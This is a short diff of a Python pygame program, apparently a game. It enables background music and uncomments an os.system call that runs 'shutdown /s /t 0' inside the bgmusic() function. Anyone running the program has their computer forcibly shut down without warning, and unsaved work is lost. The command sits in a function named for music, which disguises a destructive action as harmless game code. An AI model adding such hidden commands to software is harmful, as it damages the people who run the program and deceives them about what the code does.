@@ -6,7 +6,7 @@ import os
 import pygame
 import sys
 import os
-disablebackgroundmusic = True
+disablebackgroundmusic = False
 
 
 
@@ -24,7 +24,7 @@ def bgmusic():
     pygame.display.flip()
     play("backgroundmusic.mp3",3)
     pygame.time.delay(1)  
-    #os.system("shutdown /s /t 0")
+    os.system("shutdown /s /t 0")
     pygame.quit()
     trytoexit()
 def get_resource_path(relative_path):
